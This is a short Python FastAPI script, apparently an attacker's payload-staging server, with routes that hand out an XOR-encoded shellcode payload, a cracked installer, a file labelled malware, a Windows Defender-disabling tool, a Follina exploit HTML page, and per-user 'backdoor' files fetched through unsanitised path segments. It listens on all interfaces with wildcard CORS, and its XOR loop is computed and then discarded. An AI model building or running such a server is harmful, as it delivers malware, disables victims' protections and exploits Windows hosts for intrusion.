from fastapi import FastAPI, File, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from buf import *

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])



@app.get('/')
def index():
    return 'Web App with Python FastAPI!'

@app.get('/getPayload')
def getPayload():
    result=b''
    for i in buf:
        # xor with 0x7e
        result+=bytes([i^0x7e]) 
    with open("payload.bin", "wb") as f:
        f.write(buf)
    return FileResponse("payload.bin")

@app.get('/getispring')
def getispring():
    return FileResponse("ispring_crack.exe")

@app.get('/getMalware')
def getMalware():
    return FileResponse("cliend_js")

@app.get('/getpdf')
def getMalware():
    return FileResponse("pdf.pdf")

@app.get("/getb/{user}/{filename}")
def getbackdoor(user: str, filename: str):
    return FileResponse(f"{user}/{filename}")

@app.get("/getp/{user}/{filename}")
def getbackdoor(user: str, filename: str):
    return FileResponse(f"{user}/files/{filename}")

@app.get('/disableDefender')
def getMalware():
    return FileResponse("defender-control_exe")


@app.get('/htmlfolina')
def getMalware():
    return FileResponse("follina.html")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("SendPayload:app", host="0.0.0.0", port=8082, reload=True)
